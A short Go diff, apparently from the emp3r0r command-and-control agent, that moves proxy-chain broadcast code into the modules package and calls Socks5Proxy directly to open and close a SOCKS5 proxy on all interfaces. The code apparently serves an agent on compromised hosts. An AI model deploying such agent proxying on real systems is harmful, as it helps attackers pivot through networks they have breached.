@@ -1,4 +1,4 @@
-package proxychain
+package modules
 
 import (
 	"context"
@@ -11,7 +11,6 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
@@ -225,13 +224,13 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 
 	if start_socks5 {
 		// start a socks5 proxy
-		err := modules.Socks5Proxy("on", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
+		err := Socks5Proxy("on", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
 		if err != nil {
 			log.Printf("Socks5Proxy on: %v", err)
 			return
 		}
 		defer func() {
-			err := modules.Socks5Proxy("off", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
+			err := Socks5Proxy("off", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
 			if err != nil {
 				log.Printf("Socks5Proxy off: %v", err)
 			}
